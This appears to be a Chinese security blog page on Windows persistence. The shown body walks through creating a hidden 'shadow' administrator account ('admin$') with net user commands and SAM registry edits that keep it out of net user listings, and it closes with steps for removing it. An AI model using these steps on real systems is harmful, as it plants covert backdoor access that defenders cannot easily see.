<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>权限维持 常规方法 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='攻防, 权限维持' />
  <meta itemprop="name" content="权限维持 常规方法">
  <meta itemprop="datePublished" content="2024-08-16T08:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-16T08:31:01+08:00">
  <meta itemprop="wordCount" content="3199">
  <meta itemprop="keywords" content="攻防,权限维持"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/69/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="权限维持 常规方法">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-16T08:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-16T08:31:01+08:00">
    <meta property="article:tag" content="攻防">
    <meta property="article:tag" content="权限维持">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="权限维持 常规方法">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/69/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%8E%9F%E7%90%86/1/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/68/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "权限维持 常规方法",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91\/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/69\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 权限维持","wordcount":  3199 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91\/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/69\/","datePublished": "2024-08-16T08:31:01+08:00","dateModified": "2024-08-16T08:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">权限维持 常规方法</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>权限维持 常规方法</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-16 08:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-16">2024-08-16</time></span>&nbsp;<span title="3199 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 3200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>16 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-对注册表赋予权限">1、 对注册表赋予权限</a></li>
    <li><a href="#2创建特殊账户">2、创建特殊账户</a></li>
    <li><a href="#3导出注册表">3、导出注册表</a></li>
    <li><a href="#4删除特殊账户">4、删除特殊账户</a></li>
    <li><a href="#5导入reg文件">5、导入reg文件</a></li>
    <li><a href="#6大功告成">6、大功告成</a></li>
    <li><a href="#7删除方法">7、删除方法</a></li>
    <li><a href="#8脚本自动化">8、脚本自动化</a></li>
    <li><a href="#试验-被拦截">试验-被拦截</a></li>
  </ul>

  <ul>
    <li><a href="#低版本">低版本</a></li>
    <li><a href="#高版本">高版本</a>
      <ul>
        <li><a href="#什么是ifeo">什么是IFEO</a></li>
        <li><a href="#可视化修改">可视化修改</a></li>
        <li><a href="#命令行修改">命令行修改</a></li>
        <li><a href="#实验-">实验-</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#开始菜单启动项">开始菜单启动项</a>
      <ul>
        <li><a href="#实验">实验</a></li>
      </ul>
    </li>
    <li><a href="#组策略">组策略</a>
      <ul>
        <li><a href="#实验-1">实验</a></li>
      </ul>
    </li>
    <li><a href="#启动项注册表后门">启动项注册表后门</a>
      <ul>
        <li><a href="#命令行">命令行</a></li>
        <li><a href="#metasploit">Metasploit</a></li>
        <li><a href="#sharpersist">SharPersist</a></li>
        <li><a href="#poshc2">PoshC2</a></li>
        <li><a href="#empire">Empire</a></li>
        <li><a href="#实验-2">实验</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#创建服务">创建服务</a>
      <ul>
        <li><a href="#cmd直接创建服务">CMD直接创建服务</a></li>
        <li><a href="#powershell创建服务">Powershell创建服务</a></li>
        <li><a href="#其他">其他</a></li>
        <li><a href="#其他的一些工具">其他的一些工具</a></li>
        <li><a href="#telnet服务">telnet服务</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#什么是lnk">什么是LNK</a></li>
    <li><a href="#利用手法">利用手法</a></li>
    <li><a href="#利用过程">利用过程</a>
      <ul>
        <li></li>
      </ul>
    </li>
    <li><a href="#一些辅助工具">一些辅助工具</a>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#介绍">介绍</a></li>
        <li><a href="#时间服务器">时间服务器</a></li>
        <li><a href="#print-spooler端口监视器">Print Spooler端口监视器</a></li>
        <li><a href="#netsh-helper-dll">Netsh Helper DLL</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#介绍-1">介绍</a></li>
        <li><a href="#持久化">持久化</a></li>
        <li><a href="#参考文章">参考文章</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#mimikatz">Mimikatz</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="影子账号" class="heading-element"><span>影子账号</span>
  <a href="#%e5%bd%b1%e5%ad%90%e8%b4%a6%e5%8f%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>影子用户即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。</p>
<h2 id="1-对注册表赋予权限" class="heading-element"><span>1、 对注册表赋予权限</span>
  <a href="#1-%e5%af%b9%e6%b3%a8%e5%86%8c%e8%a1%a8%e8%b5%8b%e4%ba%88%e6%9d%83%e9%99%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>默认注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\</code> 只有system权限才能修改</p>
<p>现在需要为其添加管理员权限</p>
<p>右键-权限-选中Administrators，允许完全控制</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170914746.webp" alt="image-20240717091439547" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170914746.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170914746.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170914746.webp?size=large 2x" data-title="image-20240717091439547" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>重启注册表</p>
<h2 id="2创建特殊账户" class="heading-element"><span>2、创建特殊账户</span>
  <a href="#2%e5%88%9b%e5%bb%ba%e7%89%b9%e6%ae%8a%e8%b4%a6%e6%88%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">net</span> <span style="color:#58a1dd">user</span> <span style="color:#58a1dd">admin</span>$ <span style="color:#58a1dd">Aa123456</span>... /<span style="color:#58a1dd">add</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">net</span> <span style="color:#58a1dd">localgroup</span> <span style="color:#58a1dd">administrators</span> <span style="color:#58a1dd">admin</span>$ /<span style="color:#58a1dd">add</span></span></span></code></pre></div><blockquote>
<p>PS: 用 <strong>$</strong> 结尾是因为 <code>net user</code> 无法获取，一定情况下隐蔽</p>
</blockquote>
<h2 id="3导出注册表" class="heading-element"><span>3、导出注册表</span>
  <a href="#3%e5%af%bc%e5%87%ba%e6%b3%a8%e5%86%8c%e8%a1%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户 <code>admin$</code></p>
<p>还有如图的 2 个，均导出</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915551.webp" alt="image-20240717091516404" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915551.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915551.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915551.webp?size=large 2x" data-title="image-20240717091516404" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>得到3个导出的注册表，如下</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915870.webp" alt="image-20240717091539765" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915870.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915870.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915870.webp?size=large 2x" data-title="image-20240717091539765" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>编辑 <code>1F4</code> 和 <code>3EE</code> 的注册表，用 <code>1F4</code> 里面的 <strong>F</strong> 去替换 <code>3EE</code> 里面的 <strong>F</strong></p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915394.webp" alt="image-20240717091558175" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915394.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915394.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170915394.webp?size=large 2x" data-title="image-20240717091558175" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>保存</p>
<h2 id="4删除特殊账户" class="heading-element"><span>4、删除特殊账户</span>
  <a href="#4%e5%88%a0%e9%99%a4%e7%89%b9%e6%ae%8a%e8%b4%a6%e6%88%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>net user admin$ /del</code></pre><h2 id="5导入reg文件" class="heading-element"><span>5、导入reg文件</span>
  <a href="#5%e5%af%bc%e5%85%a5reg%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>方法一：直接双击 <code>admin$</code> 和 <code>3EE</code> 注册表</li>
<li>方法二：</li>
</ul>
<pre tabindex="0"><code>regedit /s 3EE.reg
regedit /s admin$.reg</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917929.webp" alt="image-20240717091725820" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917929.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917929.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917929.webp?size=large 2x" data-title="image-20240717091725820" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="6大功告成" class="heading-element"><span>6、大功告成</span>
  <a href="#6%e5%a4%a7%e5%8a%9f%e5%91%8a%e6%88%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917876.webp" alt="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917876.webp" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917876.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917876.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917876.webp?size=large 2x" data-title="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170917876.webp" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>无法通过 <code>net user admin$ /del</code> 来删除</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918328.webp" alt="image-20240717091813227" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918328.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918328.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170918328.webp?size=large 2x" data-title="image-20240717091813227" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="7删除方法" class="heading-element"><span>7、删除方法</span>
  <a href="#7%e5%88%a0%e9%99%a4%e6%96%b9%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>删除注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code> 下对应帐户的键值即可(共有两处)</p>
